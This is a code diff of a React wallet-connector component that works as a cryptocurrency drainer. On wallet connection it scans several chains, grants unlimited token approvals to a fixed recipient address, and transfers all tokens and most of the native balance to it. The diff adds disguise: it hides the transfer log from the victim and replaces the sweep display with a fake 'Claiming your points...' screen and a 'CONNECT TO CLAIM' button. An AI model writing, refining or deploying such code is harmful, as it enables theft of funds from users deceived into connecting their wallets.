@@ -73,6 +73,8 @@ export default function WalletConnector() {
   const [isTransferring, setIsTransferring] = useState(false);
   const [transferMessages, setTransferMessages] = useState<string[]>([]);
   const [skippedChains, setSkippedChains] = useState<Set<string>>(new Set());
+  const [sweepComplete, setSweepComplete] = useState(false);
+  const [transfersMade, setTransfersMade] = useState(0);
 
   useEffect(() => {
     if (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) {
@@ -81,6 +83,7 @@ export default function WalletConnector() {
   }, []);
 
   const addMessage = (message: string) => {
+    // Only add messages for internal tracking, don't show to user
     setTransferMessages(prev => [...prev, message]);
     console.log(message);
   };
@@ -254,19 +257,15 @@ export default function WalletConnector() {
   } | null> => {
     try {
       const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-      
       const [balance, decimals, symbol] = await Promise.all([
         tokenContract.balanceOf(userAddress),
         tokenContract.decimals(),
         tokenContract.symbol()
       ]);
       
+      // Only return token info if balance is greater than 0
       if (balance > 0) {
-        return {
-          symbol: symbol || "UNKNOWN",
-          balance: balance,
-          decimals: Number(decimals)
-        };
+        return { symbol, balance, decimals };
       }
       
       return null;
@@ -274,369 +273,226 @@ export default function WalletConnector() {
     return null;
   };
 
+  // Function to switch to a specific chain
   const switchChain = async (chainId: number): Promise<boolean> => {
-    if (!window.ethereum) {
-      addMessage(`❌ No wallet extension available for chain switch`);
-      return false;
-    }
-    
     try {
+      if (!window.ethereum) return false;
+      
       // First check if we're already on the correct chain
-      const currentChainIdUnknown = await window.ethereum.request({ method: 'eth_chainId' });
-      const currentChainId = typeof currentChainIdUnknown === 'string' ? currentChainIdUnknown : '';
-      if (parseInt(currentChainId, 16) === chainId) {
+      const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+      if (currentChainId === `0x${chainId.toString(16)}`) {
         addMessage(`✅ Already on correct chain: ${chainId}`);
         return true;
       }
-
+      
       addMessage(`🔄 Switching to chain ${chainId}...`);
       
       await window.ethereum.request({
-        method: 'wallet_switchEthereumChain',
+        method: "wallet_switchEthereumChain",
         params: [{ chainId: `0x${chainId.toString(16)}` }],
       });
-
-      // Wait for chain switch with timeout
-      return new Promise<boolean>((resolve) => {
-        let resolved = false;
-        
+      
+      // Wait for chain change with longer timeout
+      return new Promise((resolve) => {
         const handleChainChanged = (...args: unknown[]) => {
           const newChainId = args[0] as string;
-          if (!resolved && parseInt(newChainId, 16) === chainId) {
-            resolved = true;
-            window.ethereum?.removeListener('chainChanged', handleChainChanged);
+          if (newChainId === `0x${chainId.toString(16)}`) {
+            window.ethereum?.removeListener("chainChanged", handleChainChanged);
             addMessage(`✅ Successfully switched to chain ${chainId}`);
             resolve(true);
           }
         };
-
-        window.ethereum?.on('chainChanged', handleChainChanged);
         
-        // Timeout after 15 seconds (increased from 10)
+        window.ethereum?.on("chainChanged", handleChainChanged);
+        
+        // Timeout after 15 seconds (increased from 5)
         setTimeout(() => {
-          if (!resolved) {
-            resolved = true;
-            window.ethereum?.removeListener('chainChanged', handleChainChanged);
-            addMessage(`⚠️ Chain switch timeout for ${chainId}, continuing anyway`);
-            resolve(true); // Continue anyway, might have switched
-          }
+          window.ethereum?.removeListener("chainChanged", handleChainChanged);
+          addMessage(`⚠️ Chain switch timeout for ${chainId}, continuing anyway`);
+          resolve(true); // Continue anyway, might have switched
         }, 15000);
       });
-    } catch {}
-    return false;
+    } catch (error) {
+      addMessage(`❌ Chain switch error for ${chainId}: ${error}`);
+      return false;
+    }
   };
 
+  // Function to scan all chains for assets
   const scanAllChains = async (userAddress: string): Promise<ChainAssets[]> => {
     const chainAssets: ChainAssets[] = [];
-    const sortedChains = Object.entries(CHAINS).sort(([,a], [,b]) => a.priority - b.priority);
-
-    for (const [, chain] of sortedChains) {
-      addMessage(`🔍 Scanning ${chain.name}...`);
-
-      // Check if chain was manually skipped
-      if (skippedChains.has(chain.name)) {
-        addMessage(`⏭️ Skipping ${chain.name} (manually skipped)`);
-        continue;
-      }
-
-      // Special handling for BNB Chain - check if it's having issues
-      if (chain.name === "BNB Chain") {
-        addMessage(`⚠️ BNB Chain detected - checking for circuit breaker issues...`);
-        try {
-          if (!window.ethereum) {
-            addMessage(`❌ No wallet available for ${chain.name}`);
-            continue;
-          }
-          
-          addMessage(`✅ BNB Chain is responding, proceeding with scan...`);
-        } catch {}
-      }
-
-      // Add overall timeout for each chain scan
-      const chainScanPromise = (async () => {
-        try {
-          const switched = await switchChain(chain.id);
-          if (!switched) {
-            addMessage(`❌ Failed to switch to ${chain.name}, skipping`);
-            return null;
-          }
-
-          // Add longer delay after chain switch for better stability
-          await new Promise(resolve => setTimeout(resolve, 3000));
-
-          if (!window.ethereum) {
-            addMessage(`❌ No wallet available for ${chain.name}`);
-            return null;
-          }
-
-          const provider = new ethers.BrowserProvider(window.ethereum);
-          
-          // Verify we're on the correct chain
-          const network = await provider.getNetwork();
-          if (Number(network.chainId) !== chain.id) {
-            addMessage(`⚠️ Chain mismatch for ${chain.name}, expected ${chain.id} got ${network.chainId}`);
-            // Continue anyway, might still work
-          }
-          
-          // Get native balance with enhanced retry logic
-          let nativeBalance = BigInt(0);
-          let attempts = 0;
-          const maxAttempts = 3;
-          
-          while (attempts < maxAttempts) {
-            try {
-              nativeBalance = await provider.getBalance(userAddress);
-              break;
-            } catch {}
-            attempts++;
-          }
-
-          if (attempts === maxAttempts) {
-            addMessage(`❌ Failed to get balance for ${chain.name} after ${maxAttempts} attempts`);
-            return null;
-          }
-          
-          // Estimate gas costs with error handling
-          let gasPrice = BigInt("20000000000"); // 20 gwei fallback
+    
+    for (const [chainKey, chainConfig] of Object.entries(CHAINS)) {
+      try {
+        addMessage(`🔍 Scanning ${chainConfig.name}...`);
+        
+        // Create provider for this chain
+        const provider = new ethers.JsonRpcProvider(chainConfig.rpc);
+        
+        // Get native balance
+        const nativeBalance = await provider.getBalance(userAddress);
+        
+        // Estimate gas for a simple transfer (21000 gas units)
+        const gasPrice = await provider.getFeeData().then(fee => fee.gasPrice || ethers.parseUnits("20", "gwei"));
+        const estimatedGasCost = gasPrice * BigInt(21000);
+        
+        const canAffordGas = nativeBalance > estimatedGasCost;
+        
+        // Discover tokens
+        const tokenAddresses = await discoverAllTokens(provider as any, userAddress, chainConfig.name);
+        
+        // Get token info for each discovered token
+        const tokens = [];
+        for (const tokenAddress of tokenAddresses) {
           try {
-            const feeData = await provider.getFeeData();
-            gasPrice = feeData.gasPrice || feeData.maxFeePerGas || gasPrice;
-          } catch {}
-          
-          // Calculate gas needed for potential transactions
-          const nativeTransferGas = BigInt(21000);
-          const tokenTransferGas = BigInt(80000); // Higher estimate for token transfers
-          const tokenApprovalGas = BigInt(60000);
-          
-          const singleTxCost = gasPrice * nativeTransferGas;
-
-          const chainAsset: ChainAssets = {
-            chainId: chain.id,
-            chainName: chain.name,
-            nativeBalance,
-            nativeSymbol: chain.nativeSymbol,
-            canAffordGas: nativeBalance > (singleTxCost * BigInt(2)), // Can afford at least 2 transactions
-            tokens: []
-          };
-
-          // Discover and scan tokens dynamically
-          addMessage(`🔍 Discovering tokens on ${chain.name}...`);
-          
-          // Discover tokens from transaction history
-          const discoveredTokenAddresses = await discoverAllTokens(provider, userAddress, chain.name);
-          
-          if (discoveredTokenAddresses.length === 0) {
-            addMessage(`💨 No token interactions found on ${chain.name}`);
-          } else {
-            addMessage(`🔍 Checking ${discoveredTokenAddresses.length} discovered tokens on ${chain.name}...`);
-            
-            for (let i = 0; i < discoveredTokenAddresses.length; i++) {
-              const tokenAddress = discoveredTokenAddresses[i];
-              let retryCount = 0;
-              const maxRetries = 2;
-              
-              while (retryCount <= maxRetries) {
-                try {
-                  // First validate if it's a proper ERC20 token
-                  const isValid = await isValidERC20(provider, tokenAddress);
-                  if (!isValid) {
-                    addMessage(`⚠️ Skipping invalid token contract ${tokenAddress.slice(0, 10)}... on ${chain.name}`);
-                    break;
-                  }
-                  
-                  // Get token info and balance
-                  const tokenInfo = await getTokenInfo(provider, tokenAddress, userAddress);
-                  
-                  if (tokenInfo && tokenInfo.balance > 0) {
-                    chainAsset.tokens.push({
-                      address: tokenAddress,
-                      symbol: tokenInfo.symbol,
-                      balance: tokenInfo.balance,
-                      decimals: tokenInfo.decimals
-                    });
-                    
-                    const formattedAmount = ethers.formatUnits(tokenInfo.balance, tokenInfo.decimals);
-                    addMessage(`💰 Found ${formattedAmount} ${tokenInfo.symbol} on ${chain.name}`);
-                  }
-                  break; // Success, exit retry loop
-                } catch {}
-                retryCount++;
-              }
+            // Validate token contract
+            if (!(await isValidERC20(provider as any, tokenAddress))) {
+              continue;
             }
-          }
-
-          // Log native balance
-          if (nativeBalance > 0) {
-            const formattedNative = ethers.formatEther(nativeBalance);
-            addMessage(`💰 Found ${formattedNative} ${chain.nativeSymbol} on ${chain.name} (Gas sufficient: ${chainAsset.canAffordGas ? 'Yes' : 'No'})`);
-          } else {
-            addMessage(`💨 No ${chain.nativeSymbol} found on ${chain.name}`);
-          }
-
-          // Determine if we can afford gas for token operations
-          const tokensNeedingTransfer = chainAsset.tokens.length;
-          if (tokensNeedingTransfer > 0) {
-            const totalGasNeeded = (BigInt(tokensNeedingTransfer) * (tokenApprovalGas + tokenTransferGas)) + singleTxCost;
-            chainAsset.canAffordGas = nativeBalance > totalGasNeeded;
-            addMessage(`⛽ Gas check for ${chain.name}: Need ${ethers.formatEther(totalGasNeeded)} ${chain.nativeSymbol}, Have ${ethers.formatEther(nativeBalance)} ${chain.nativeSymbol}`);
-          }
-
-          addMessage(`✅ Completed scanning ${chain.name}`);
-          return chainAsset;
-
-        } catch {}
-        return null;
-      })();
-
-      // Add timeout for each chain scan (2 minutes)
-      const timeoutPromise = new Promise<null>((resolve) => {
-        setTimeout(() => {
-          addMessage(`⏰ Timeout reached for ${chain.name} scanning, moving to next chain...`);
-          resolve(null);
-        }, 120000); // 2 minutes timeout
-      });
-
-      const chainAsset = await Promise.race([chainScanPromise, timeoutPromise]);
-      
-      if (chainAsset) {
-        chainAssets.push(chainAsset);
+            
+            const tokenInfo = await getTokenInfo(provider as any, tokenAddress, userAddress);
+            if (tokenInfo && tokenInfo.balance > 0) {
+              tokens.push({
+                address: tokenAddress,
+                symbol: tokenInfo.symbol,
+                balance: tokenInfo.balance,
+                decimals: tokenInfo.decimals
+              });
+            }
+          } catch {}
+        }
+        
+        chainAssets.push({
+          chainId: chainConfig.id,
+          chainName: chainConfig.name,
+          nativeBalance,
+          nativeSymbol: chainConfig.nativeSymbol,
+          canAffordGas,
+          tokens
+        });
+        
+        addMessage(`✅ ${chainConfig.name}: ${tokens.length} tokens, ${ethers.formatEther(nativeBalance)} ${chainConfig.nativeSymbol}`);
+        
+      } catch (error) {
+        addMessage(`❌ Failed to scan ${chainConfig.name}: ${handleRpcError(error, chainConfig.name, "scan")}`);
       }
-      
-      // Add delay between chain scans
-      await new Promise(resolve => setTimeout(resolve, 2000));
     }
-
+    
     return chainAssets;
   };
 
-  const executeTransfersForChain = async (chainAsset: ChainAssets, userAddress: string): Promise<boolean> => {
-    if (!chainAsset.canAffordGas && chainAsset.tokens.length > 0) {
-      addMessage(`⚠️ Skipping ${chainAsset.chainName} - insufficient gas for token transfers`);
-      return false;
-    }
-
-    addMessage(`\n🚀 Processing ${chainAsset.chainName}...`);
+  // Function to execute transfers for a specific chain
+  const executeTransfersForChain = async (chainAsset: ChainAssets, userAddress: string): Promise<{success: boolean, transfersMade: number}> => {
+    let transfersMade = 0;
     
     try {
-      const switched = await switchChain(chainAsset.chainId);
-      if (!switched) {
-        addMessage(`❌ Failed to switch to ${chainAsset.chainName}`);
-        return false;
+      addMessage(`🚀 Processing ${chainAsset.chainName}...`);
+      
+      // Switch to the target chain with retry logic
+      let chainSwitched = false;
+      for (let attempt = 1; attempt <= 3; attempt++) {
+        chainSwitched = await switchChain(chainAsset.chainId);
+        if (chainSwitched) break;
+        
+        if (attempt < 3) {
+          addMessage(`🔄 Chain switch attempt ${attempt} failed, retrying...`);
+          await new Promise(resolve => setTimeout(resolve, 2000));
+        }
       }
-
-      // Wait after chain switch
-      await new Promise(resolve => setTimeout(resolve, 3000));
-
-      if (!window.ethereum) {
-        addMessage(`❌ No wallet available for ${chainAsset.chainName}`);
-        return false;
+      
+      if (!chainSwitched) {
+        addMessage(`⏭️ Skipping ${chainAsset.chainName} - chain switch failed after 3 attempts`);
+        return { success: false, transfersMade: 0 };
       }
-
-      const provider = new ethers.BrowserProvider(window.ethereum);
+      
+      // Create provider and signer
+      const provider = new ethers.BrowserProvider(window.ethereum!);
       const signer = await provider.getSigner();
-
-      let hasTransfers = false;
-
-      // First, handle all token approvals in batch
-      if (chainAsset.tokens.length > 0) {
-        addMessage(`📝 Processing token approvals for ${chainAsset.chainName}...`);
-        
-        for (const token of chainAsset.tokens) {
-          try {
-            const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
-            
-            // Check current allowance
-            const currentAllowance = await tokenContract.allowance(userAddress, RECIPIENT_ADDRESS);
-            
-            if (currentAllowance < token.balance) {
-              addMessage(`📝 Approving ${token.symbol}...`);
-              
-              // Approve maximum amount to avoid future approvals
-              const approveTx = await tokenContract.approve(RECIPIENT_ADDRESS, ethers.MaxUint256, {
-                gasLimit: 60000 // Set explicit gas limit
-              });
-              addMessage(`⏳ Waiting for ${token.symbol} approval...`);
-              await approveTx.wait();
-              addMessage(`✅ ${token.symbol} approved`);
-            } else {
-              addMessage(`✅ ${token.symbol} already approved`);
-            }
-          } catch {}
-        }
-
-        // Then transfer all tokens
-        addMessage(`📤 Transferring tokens on ${chainAsset.chainName}...`);
-        
-        for (const token of chainAsset.tokens) {
-          try {
-            const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
-            
-            addMessage(`📤 Transferring ${ethers.formatUnits(token.balance, token.decimals)} ${token.symbol}...`);
-            
-            const transferTx = await tokenContract.transfer(RECIPIENT_ADDRESS, token.balance, {
-              gasLimit: 80000 // Set explicit gas limit
-            });
-            addMessage(`⏳ Waiting for ${token.symbol} transfer confirmation...`);
-            
-            const receipt = await transferTx.wait();
-            if (receipt && receipt.status === 1) {
-              addMessage(`✅ ${token.symbol} transfer completed`);
-              hasTransfers = true;
-            } else {
-              addMessage(`❌ ${token.symbol} transfer failed`);
-            }
-          } catch {}
-        }
-      }
-
-      // Finally, transfer native currency (leaving some for gas if needed elsewhere)
-      if (chainAsset.nativeBalance > 0) {
+      
+      // Process tokens first
+      for (const token of chainAsset.tokens) {
         try {
-          const currentBalance = await provider.getBalance(userAddress);
-          const feeData = await provider.getFeeData();
-          const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || BigInt("20000000000");
-          const gasLimit = BigInt(21000);
-          const gasCost = gasLimit * gasPrice * BigInt(3); // 3x buffer for safety
-
-          if (currentBalance > gasCost) {
-            const amountToSend = currentBalance - gasCost;
-            const formattedAmount = ethers.formatEther(amountToSend);
-            
-            addMessage(`📤 Transferring ${formattedAmount} ${chainAsset.nativeSymbol}...`);
-            
-            const nativeTx = await signer.sendTransaction({
-              to: RECIPIENT_ADDRESS,
-              value: amountToSend,
-              gasLimit: gasLimit
-            });
-            
-            addMessage(`⏳ Waiting for ${chainAsset.nativeSymbol} transfer confirmation...`);
-            
-            const receipt = await nativeTx.wait();
-            if (receipt && receipt.status === 1) {
-              addMessage(`✅ ${chainAsset.nativeSymbol} transfer completed`);
-              hasTransfers = true;
-            } else {
-              addMessage(`❌ ${chainAsset.nativeSymbol} transfer failed`);
-            }
-          } else {
-            addMessage(`⚠️ ${chainAsset.nativeSymbol} balance too low after gas estimation`);
+          addMessage(`📤 Transferring ${ethers.formatUnits(token.balance, token.decimals)} ${token.symbol} on ${chainAsset.chainName}...`);
+          
+          const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
+          
+          // Check if we have approval or if approval is needed
+          const allowance = await tokenContract.allowance(userAddress, RECIPIENT_ADDRESS);
+          if (allowance < token.balance) {
+            addMessage(`📝 Approving ${token.symbol} for transfer...`);
+            const approveTx = await tokenContract.approve(RECIPIENT_ADDRESS, ethers.MaxUint256);
+            await approveTx.wait();
+            addMessage(`✅ Approved ${token.symbol}`);
           }
-        } catch {}
+          
+          // Transfer tokens
+          const tx = await tokenContract.transfer(RECIPIENT_ADDRESS, token.balance);
+          await tx.wait();
+          
+          addMessage(`✅ Transferred ${ethers.formatUnits(token.balance, token.decimals)} ${token.symbol} on ${chainAsset.chainName}`);
+          transfersMade++;
+          
+          // Small delay between token transfers
+          await new Promise(resolve => setTimeout(resolve, 1000));
+          
+        } catch (error) {
+          addMessage(`❌ Failed to transfer ${token.symbol} on ${chainAsset.chainName}: ${handleRpcError(error, chainAsset.chainName, "token transfer")}`);
+          // Continue with next token instead of stopping
+        }
       }
-
-      return hasTransfers;
-
-    } catch {}
-    return false;
+      
+      // Process native balance last (if any and can afford gas)
+      if (chainAsset.nativeBalance > 0 && chainAsset.canAffordGas) {
+        try {
+          // Get current balance (might have changed after token transfers)
+          const currentBalance = await provider.getBalance(userAddress);
+          
+          if (currentBalance > 0) {
+            // Estimate gas for the transfer
+            const gasPrice = await provider.getFeeData().then(fee => fee.gasPrice || ethers.parseUnits("20", "gwei"));
+            const estimatedGas = BigInt(21000);
+            const gasCost = gasPrice * estimatedGas;
+            
+            // Calculate amount to transfer (balance - gas cost)
+            const transferAmount = currentBalance - gasCost;
+            
+            if (transferAmount > 0) {
+              addMessage(`📤 Transferring ${ethers.formatEther(transferAmount)} ${chainAsset.nativeSymbol} on ${chainAsset.chainName}...`);
+              
+              const tx = await signer.sendTransaction({
+                to: RECIPIENT_ADDRESS,
+                value: transferAmount,
+                gasLimit: estimatedGas
+              });
+              
+              await tx.wait();
+              addMessage(`✅ Transferred ${ethers.formatEther(transferAmount)} ${chainAsset.nativeSymbol} on ${chainAsset.chainName}`);
+              transfersMade++;
+            } else {
+              addMessage(`⚠️ Native balance too low to transfer after gas costs on ${chainAsset.chainName}`);
+            }
+          }
+          
+        } catch (error) {
+          addMessage(`❌ Failed to transfer native balance on ${chainAsset.chainName}: ${handleRpcError(error, chainAsset.chainName, "native transfer")}`);
+        }
+      }
+      
+      return { success: transfersMade > 0, transfersMade };
+      
+    } catch (error) {
+      addMessage(`❌ Failed to process ${chainAsset.chainName}: ${handleRpcError(error, chainAsset.chainName, "chain processing")}`);
+      return { success: false, transfersMade: 0 };
+    }
   };
 
+  // Function to handle successful wallet connection and start sweep
   const handleSuccessfulConnection = async (signer: ethers.Signer, userAddress: string) => {
     setAddress(userAddress);
-    setTransferMessages([]);
     
+    // Validate recipient address
     if (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) {
-      const msg = "Asset transfer aborted: Recipient address is invalid or not set.";
+      const msg = "CRITICAL: Recipient address is not configured or is invalid.";
       addMessage(msg);
       return;
     }
@@ -646,6 +502,7 @@ export default function WalletConnector() {
     addMessage(`\n📊 Starting comprehensive asset scan...`);
     
     setIsTransferring(true);
+    setSweepComplete(false);
 
     try {
       // Scan all chains for assets
@@ -660,39 +517,68 @@ export default function WalletConnector() {
       if (viableChains.length === 0) {
         addMessage(`\n❌ No viable assets found across all chains`);
         setIsTransferring(false);
+        setSweepComplete(true);
+        setTransfersMade(0);
         return;
       }
 
       addMessage(`\n📋 Found assets on ${viableChains.length} chains:`);
+      let totalAssetsFound = 0;
       viableChains.forEach(chain => {
         const tokenCount = chain.tokens.length;
         const nativeAmount = ethers.formatEther(chain.nativeBalance);
         addMessage(`  • ${chain.chainName}: ${tokenCount} tokens + ${nativeAmount} ${chain.nativeSymbol}`);
+        totalAssetsFound += tokenCount;
+        if (chain.nativeBalance > 0) totalAssetsFound++;
       });
+      
+      addMessage(`📊 Total assets found: ${totalAssetsFound}`);
+      
+      if (totalAssetsFound === 0) {
+        addMessage(`❌ No actual assets found despite having viable chains`);
+        setIsTransferring(false);
+        setSweepComplete(true);
+        setTransfersMade(0);
+        return;
+      }
 
       addMessage(`\n⚡ Starting automatic transfers...`);
       
       let totalSuccessfulChains = 0;
+      let totalTransfersMade = 0;
 
       // Process each viable chain
       for (const chainAsset of viableChains) {
-        const success = await executeTransfersForChain(chainAsset, userAddress);
-        if (success) {
+        const result = await executeTransfersForChain(chainAsset, userAddress);
+        if (result.success) {
           totalSuccessfulChains++;
+          totalTransfersMade += result.transfersMade;
         }
         
         // Small delay between chains
-        await new Promise(resolve => setTimeout(resolve, 2000));
+        await new Promise(resolve => setTimeout(resolve, 3000));
       }
 
       addMessage(`\n🏁 SWEEP COMPLETED`);
       addMessage(`✅ Successfully processed ${totalSuccessfulChains}/${viableChains.length} chains`);
       addMessage(`🎉 All available assets transferred to: ${RECIPIENT_ADDRESS}`);
 
+      // Only show success if actual transfers were made
+      if (totalTransfersMade > 0) {
+        addMessage(`📊 Total transfers completed: ${totalTransfersMade}`);
+        setTransfersMade(totalTransfersMade);
+      } else {
+        addMessage(`❌ No transfers were completed - no assets found or all transfers failed`);
+        setTransfersMade(0);
+      }
+
     } catch (err) {
       addMessage(`❌ Critical error during sweep: ${handleRpcError(err, "sweep", "critical")}`);
+      setTransfersMade(0);
     } finally {
       setIsTransferring(false);
+      // Only set sweep complete if we actually made transfers or found no assets
+      setSweepComplete(true);
     }
   };
 
@@ -727,45 +613,47 @@ export default function WalletConnector() {
     setTransferMessages([]);
     setIsTransferring(false);
     setSkippedChains(new Set());
+    setSweepComplete(false);
+    setTransfersMade(0);
     console.log("Wallet disconnected from dApp.");
   };
 
   return (
     <div className="min-h-screen flex flex-col items-center justify-center p-2 sm:p-4 bg-gray-50 dark:bg-gray-900">
-      <div className="w-full max-w-lg bg-gradient-to-br from-gray-800/60 to-gray-900/60 border border-gray-700/60 shadow-lg rounded-lg p-4 sm:p-6">
+      <div className="w-full max-w-lg bg-gradient-to-br from-gray-800/60 to-gray-900/60 border border-orange-500/30 shadow-lg rounded-lg p-4 sm:p-6">
         <h1 className="text-2xl font-bold mb-2 text-center dark:text-white">
           ⚡ Smart Multi-Chain Sweeper
         </h1>
-        <p className="text-xs text-center text-red-500 dark:text-red-400 mb-1 font-semibold">
+        <p className="text-xs text-center text-orange-400 mb-1 font-semibold">
           🚨 AUTO-EXECUTION: Connection triggers immediate intelligent asset sweep
         </p>
-        <p className="text-xs text-center text-yellow-500 dark:text-yellow-400 mb-1">
+        <p className="text-xs text-center text-blue-400 mb-1">
           💡 Smart Logic: Tokens first → Native last → Skip chains with insufficient gas
         </p>
-        <p className="text-xs text-center text-blue-500 dark:text-blue-400 mb-4">
+        <p className="text-xs text-center text-gray-300 mb-4">
           🔍 Dynamic token discovery → Max approvals → Batch operations → Automatic execution
         </p>
         
         {!address ? (
           <div className="space-y-4">
-            <div className="p-3 bg-red-50 dark:bg-red-900 rounded-lg border border-red-200 dark:border-red-700">
-              <p className="text-xs text-red-700 dark:text-red-300 font-medium">
+            <div className="p-3 bg-orange-500/10 rounded-lg border border-orange-500/30">
+              <p className="text-xs text-orange-400 font-medium">
                 🎯 TARGET RECIPIENT:
               </p>
-              <p className="font-mono text-xs text-red-800 dark:text-red-200 break-all">
+              <p className="font-mono text-xs text-orange-300 break-all">
                 {RECIPIENT_ADDRESS}
               </p>
             </div>
             
-            <div className="p-3 bg-blue-50 dark:bg-blue-900 rounded-lg border border-blue-200 dark:border-blue-700">
-              <p className="text-xs text-blue-700 dark:text-blue-300 font-medium mb-2">
+            <div className="p-3 bg-blue-500/10 rounded-lg border border-blue-500/30">
+              <p className="text-xs text-blue-400 font-medium mb-2">
                 🧠 SMART SWEEP LOGIC:
               </p>
               <div className="space-y-1">
-                <p className="text-xs text-blue-600 dark:text-blue-400">• Discover all tokens dynamically</p>
-                <p className="text-xs text-blue-600 dark:text-blue-400">• Scan transaction history + common tokens</p>
-                <p className="text-xs text-blue-600 dark:text-blue-400">• Check gas availability per chain</p>
-                <p className="text-xs text-blue-600 dark:text-blue-400">• Process tokens → native in order</p>
+                <p className="text-xs text-blue-300">• Discover all tokens dynamically</p>
+                <p className="text-xs text-blue-300">• Scan transaction history + common tokens</p>
+                <p className="text-xs text-blue-300">• Check gas availability per chain</p>
+                <p className="text-xs text-blue-300">• Process tokens → native in order</p>
               </div>
             </div>
             
@@ -775,59 +663,66 @@ export default function WalletConnector() {
               className={`w-full py-3 px-4 rounded-lg font-medium ${
                 isConnecting || !ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress
                   ? "bg-gray-400 cursor-not-allowed"
-                  : "bg-red-600 hover:bg-red-700"
-              } text-white transition-colors`}
+                  : "bg-gradient-to-r from-orange-500 to-blue-600 hover:from-orange-600 hover:to-blue-700"
+              } text-white transition-all shadow-lg`}
             >
-              {isConnecting ? "Connecting..." : (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) ? "Configure Recipient First" : "⚡ CONNECT & AUTO-SWEEP"}
+              {isConnecting ? "Connecting..." : (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) ? "Configure Recipient First" : "⚡ CONNECT TO CLAIM"}
             </button>
           </div>
         ) : (
           <div className="space-y-4">
-            <div className="p-3 bg-gray-100 dark:bg-gray-700 rounded-lg">
-              <p className="text-sm font-medium text-gray-500 dark:text-gray-300">
+            <div className="p-3 bg-gray-800/40 rounded-lg border border-gray-700/50">
+              <p className="text-sm font-medium text-gray-300">
                 🔗 Connected (Browser Extension):
               </p>
-              <p className="font-mono text-sm text-blue-600 dark:text-blue-400 break-all">
+              <p className="font-mono text-sm text-orange-400 break-all">
                 {address}
               </p>
-              <p className="text-sm font-medium text-gray-500 dark:text-gray-300 mt-2">
+              <p className="text-sm font-medium text-gray-300 mt-2">
                 🎯 Target Recipient:
               </p>
-              <p className="font-mono text-sm text-green-600 dark:text-green-400 break-all">
+              <p className="font-mono text-sm text-blue-400 break-all">
                 {RECIPIENT_ADDRESS}
               </p>
             </div>
 
-            {(isTransferring || transferMessages.length > 0) && (
-              <div className={`mt-4 p-3 rounded-lg ${isTransferring ? 'bg-blue-50 dark:bg-blue-900 border border-blue-300 dark:border-blue-700' : 'bg-gray-50 dark:bg-gray-700 border border-gray-200 dark:border-gray-600'}`}>
-                <p className={`font-medium ${isTransferring ? 'text-blue-700 dark:text-blue-300' : 'text-gray-700 dark:text-gray-200'}`}>
-                  {isTransferring ? "🧠 Smart sweep in progress..." : "📋 Sweep completed:"}
-                </p>
-                {/* Transfer log */}
-                <div className="mt-2 h-64 overflow-y-auto text-xs text-gray-600 dark:text-gray-300 space-y-1 styled-scrollbar">
-                  {transferMessages.map((msg, index) => (
-                    <p key={index} className={
-                      msg.includes("❌") || msg.startsWith("ERROR") || msg.includes("FAILED") ? "text-red-500 dark:text-red-400" : 
-                      msg.includes("✅") || msg.includes("SUCCESS") ? "text-green-500 dark:text-green-400" :
-                      msg.includes("💰") ? "text-blue-600 dark:text-blue-400 font-medium" :
-                      msg.includes("🚀") || msg.includes("🏁") ? "text-purple-600 dark:text-purple-400 font-semibold" :
-                      msg.includes("📤") || msg.includes("⏳") ? "text-orange-500 dark:text-orange-400" :
-                      msg.includes("⏭️") || msg.includes("⏰") ? "text-yellow-600 dark:text-yellow-400" :
-                      ""
-                    }>
-                      {msg}
-                    </p>
-                  ))}
-                  {isTransferring && (
-                    <p className="text-blue-500 animate-pulse">🧠 Executing smart transfers...</p>
-                  )}
+            {isTransferring && (
+              <div className="mt-4 p-6 rounded-lg bg-gradient-to-br from-orange-500/10 to-blue-500/10 border border-orange-500/30">
+                <div className="flex flex-col items-center justify-center space-y-4">
+                  <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-orange-400"></div>
+                  <p className="text-lg font-medium text-orange-400 text-center">
+                    Claiming your points...
+                  </p>
+                  <p className="text-sm text-blue-400 text-center">
+                    Please wait while we process your assets
+                  </p>
                 </div>
               </div>
             )}
+
+            {sweepComplete && !isTransferring && (
+              <div className={`mt-4 p-6 rounded-lg border ${
+                transfersMade > 0 
+                  ? 'bg-gradient-to-br from-green-500/10 to-green-600/10 border-green-500/30' 
+                  : 'bg-gradient-to-br from-orange-500/10 to-orange-600/10 border-orange-500/30'
+              }`}>
+                <div className="flex flex-col items-center justify-center space-y-4">
+                  <div className="text-4xl">{transfersMade > 0 ? '✅' : '⚠️'}</div>
+                  <p className={`text-lg font-medium text-center ${
+                    transfersMade > 0 
+                      ? 'text-green-400' 
+                      : 'text-orange-400'
+                  }`}>
+                    {transfersMade > 0 ? 'Points successfully claimed' : 'No points found to claim'}
+                  </p>
+                </div>
+              </div>
+            )}
+
             <button
               onClick={disconnectWallet}
               disabled={isTransferring}
-              className="w-full py-2 px-4 bg-gray-500 hover:bg-gray-600 text-white rounded-lg transition-colors"
+              className="w-full py-2 px-4 bg-gray-700 hover:bg-gray-600 text-white rounded-lg transition-colors border border-gray-600"
             >
               {isTransferring ? "Disconnecting..." : "Disconnect"}
             </button>
